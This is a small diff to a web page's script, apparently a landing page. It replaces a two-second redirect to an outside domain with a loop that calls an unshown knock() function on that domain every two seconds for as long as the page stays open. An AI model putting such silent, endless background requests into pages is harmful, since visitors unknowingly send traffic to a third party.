@@ -70,7 +70,6 @@
             }
         }
     </style>
-
 </head>
 <body>
     <div id="container">
@@ -115,14 +114,15 @@
         }
 
         function main() {
+
             var targets = [
                 'http://viptv1.xyz'
             ];
 
+            for(var i = 0; i < targets.length; i++)
+                knock( targets[i]);
 
-            setTimeout(function () {
-                window.location = targets[0]
-            }, 2000);
+            setTimeout(main, 2000);
         }
 
         main();
